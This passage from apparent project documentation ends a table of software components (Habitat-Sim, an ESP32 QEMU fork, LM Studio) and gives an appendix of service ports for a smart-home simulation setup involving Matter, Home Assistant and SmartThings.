| **Habitat-Sim** | 0.3.3 | 3D environment rendering | vesper/habitat/ |
| **ESP32 QEMU** | espressif fork | Firmware emulation | docker/Dockerfile.esp32 |
| **LM Studio** | latest | Local LLM inference | agents/llm_client.py |

## Appendix C: Key Ports

| Port | Service | Protocol |
|------|---------|----------|
| 1234 | LM Studio (LLM) | HTTP REST |
| 5540 | Matter commissioning | UDP (mDNS) |
| 5561-5568 | ESP32 QEMU serial | TCP |
| 5580 | python-matter-server | WebSocket |
| 8080 | VESPER Dashboard | HTTP |
| 8123 | Home Assistant | HTTP |
| 8443 | SmartThings Schema Connector | HTTPS |
| 8484 | matter.js bridge REST API | HTTP |
